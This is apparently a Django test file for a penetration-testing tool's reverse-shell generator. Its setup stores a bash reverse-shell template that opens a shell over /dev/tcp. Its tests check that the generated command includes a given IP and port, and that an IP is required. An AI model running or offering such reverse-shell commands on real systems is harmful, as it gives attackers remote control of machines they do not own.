from django.test import TestCase
from django.urls import reverse

from knowledge.models import SessionHistory

from .models import ShellTemplate


class ShellGeneratorViewTests(TestCase):
    def setUp(self):
        ShellTemplate.objects.create(
            name="Test Bash Reverse",
            shell_type="reverse",
            language="bash",
            os="linux",
            template="bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            is_active=True,
        )

    def test_generate_shell_and_store_history(self):
        response = self.client.post(
            reverse("shells:generator"),
            {
                "shell_type": "reverse",
                "language": "bash",
                "ip": "10.10.10.10",
                "port": 4444,
            },
        )

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "10.10.10.10/4444")
        self.assertEqual(SessionHistory.objects.count(), 1)

    def test_reverse_shell_requires_ip(self):
        response = self.client.post(
            reverse("shells:generator"),
            {
                "shell_type": "reverse",
                "language": "bash",
                "ip": "",
                "port": 4444,
            },
        )

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "IP is required for reverse shells.")

